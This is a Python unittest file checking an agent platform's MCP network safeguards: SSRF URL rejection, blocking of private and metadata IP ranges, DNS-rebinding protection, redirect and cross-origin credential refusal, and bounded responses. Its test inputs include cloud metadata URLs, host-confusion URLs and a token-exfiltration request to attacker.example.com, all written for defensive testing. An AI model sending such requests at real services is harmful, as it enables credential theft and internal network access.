import asyncio
import unittest
from unittest.mock import AsyncMock, patch
import httpx2
from agentai_platform.mcp_connections import network as net


class EndpointChecks(unittest.TestCase):
    def test_rejects_non_https_credentials_internal_names_literal_ips_and_ambiguous_urls(self):
        for url in ['http://example.com/mcp','https://localhost/mcp','https://127.0.0.1/mcp','https://[::1]/mcp',
                    'https://169.254.169.254/latest/meta-data','https://metadata.google.internal/mcp','https://example.local/mcp',
                    'https://user:secret@example.com/mcp','https://example.com/mcp?api_key=secret','https://example.com/mcp#x',
                    'https://example.com:22/mcp','https://example.com/../mcp','https://example.com\\@127.0.0.1/']:
            with self.subTest(url=url), self.assertRaises(net.ConnectionError): net.endpoint_url(url)
        self.assertEqual(net.endpoint_url('https://api.example.com:8443/v1/mcp'),'https://api.example.com:8443/v1/mcp')
    def test_blocks_private_cloud_metadata_and_ipv6_translation_ranges(self):
        for ip in ['127.0.0.1','10.0.0.1','169.254.169.254','100.100.100.200','::1','::ffff:127.0.0.1','64:ff9b::a00:1','2002:7f00:1::1','ff02::1']:
            self.assertFalse(net.public_address(ip),ip)
        self.assertTrue(net.public_address('8.8.8.8'))
    def test_a_mixed_dns_answer_is_refused(self):
        from agentai_platform.model_keys import Endpoint,resolve_public,ModelKeyError
        def dns(*args,**kwargs): return [(None,None,None,None,('8.8.8.8',443)),(None,None,None,None,('10.0.0.1',443))]
        with self.assertRaises(ModelKeyError):resolve_public(Endpoint('example.com',443,''),resolver=dns,public=net.public_address)


class TransportChecks(unittest.IsolatedAsyncioTestCase):
    async def test_connects_only_to_the_ip_that_was_validated_so_dns_cannot_rebind(self):
        with patch.object(net,'resolve_public',return_value=['8.8.8.8']) as resolve, patch.object(net.AnyIOBackend,'connect_tcp',new_callable=AsyncMock) as connect:
            await net.PublicBackend().connect_tcp('public.example.com',443,timeout=3)
            self.assertEqual(connect.call_args.args,('8.8.8.8',443))
            self.assertEqual(resolve.call_args.args[0].host,'public.example.com')
            self.assertEqual(resolve.call_args.kwargs['public'],net.public_address)
    async def test_redirects_and_credential_cross_origin_are_refused_before_following(self):
        transport=net.PublicTransport('https://service.example.com/mcp')
        self.addAsyncCleanup(transport.aclose)
        with patch.object(transport.inner,'handle_async_request',new_callable=AsyncMock,return_value=httpx2.Response(302,headers={'location':'http://169.254.169.254/'})) as send:
            with self.assertRaises(net.ConnectionError):await transport.handle_async_request(httpx2.Request('GET','https://service.example.com/mcp'))
            self.assertEqual(send.await_count,1)
            with self.assertRaises(net.ConnectionError):await transport.handle_async_request(httpx2.Request('GET','https://other.example.com/mcp',headers={'Authorization':'Bearer secret'}))
            self.assertEqual(send.await_count,1)
    async def test_oauth_refresh_and_client_secrets_never_go_to_unrelated_destinations(self):
        transport=net.PublicTransport('https://service.example.com/mcp');self.addAsyncCleanup(transport.aclose)
        transport.oauth_issuer=lambda:'https://auth.example.com'
        with patch.object(transport.inner,'handle_async_request',new_callable=AsyncMock) as send:
            for body in ['grant_type=refresh_token&refresh_token=secret','client_secret=secret']:
                with self.assertRaises(net.ConnectionError):await transport.handle_async_request(httpx2.Request('POST','https://attacker.example.com/token',content=body))
            send.assert_not_called()
    async def test_response_stream_is_bounded(self):
        class Stream(httpx2.AsyncByteStream):
            async def __aiter__(self): yield b'x'*(net.MAX_RESPONSE+1)
            async def aclose(self): pass
        with self.assertRaises(net.ConnectionError):
            async for _ in net.BoundedStream(Stream()): pass
